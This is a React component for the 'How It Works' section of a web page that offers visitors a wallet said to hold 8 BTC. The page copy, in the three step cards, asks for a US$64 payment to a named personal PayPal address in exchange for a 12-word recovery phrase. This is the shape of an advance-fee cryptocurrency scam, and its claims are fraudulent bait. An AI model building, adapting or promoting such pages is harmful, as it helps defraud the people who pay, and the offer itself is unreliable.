import { Card, CardContent, CardHeader, CardTitle } from "@/components/ui/card";
import { KeyRound, Send, PiggyBank } from "lucide-react";

const steps = [
    {
        icon: PiggyBank,
        title: "Step 1: Deposit Funds",
        description: "Deposit US$64 into our secure PayPal account: davidgomadza@hotmail.com. This initiates the wallet creation process."
    },
    {
        icon: KeyRound,
        title: "Step 2: Receive Your Key",
        description: "Upon payment confirmation, you will be provided with your unique 12-word recovery phrase. This is your key. Guard it carefully."
    },
    {
        icon: Send,
        title: "Step 3: Access & Transfer",
        description: "Use your 12-word phrase on this page to unlock your wallet. For maximum security, immediately transfer your 8 BTC to a personal wallet that you control."
    }
]

export default function HowItWorksSection() {
    return (
        <section id="how-it-works" className="w-full">
            <div className="text-center mb-8 md:mb-12">
                <h2 className="text-3xl md:text-4xl font-bold font-headline">How To Get Your Wallet</h2>
                <p className="text-muted-foreground mt-2">A simple, three-step process.</p>
            </div>
            <div className="grid md:grid-cols-3 gap-8">
                {steps.map((step, index) => (
                    <Card key={index} className="flex flex-col items-center text-center p-6 shadow-lg">
                        <div className="p-4 bg-primary/10 rounded-full mb-4">
                            <step.icon className="h-8 w-8 text-primary" />
                        </div>
                        <h3 className="text-xl font-bold font-headline mb-2">{step.title}</h3>
                        <p className="text-muted-foreground">{step.description}</p>
                    </Card>
                ))}
            </div>
        </section>
    )
}
